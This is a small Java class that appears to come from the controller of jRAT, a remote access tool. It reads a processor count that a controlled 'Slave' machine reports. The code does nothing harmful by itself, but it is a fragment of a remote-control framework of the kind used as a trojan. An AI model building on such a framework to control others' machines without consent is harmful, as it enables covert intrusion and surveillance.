package pro.jrat.client.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.client.Slave;

public class Packet64InitAvailableProcessors extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		short processors = slave.readShort();
		slave.setProcessors(processors);
	}

}
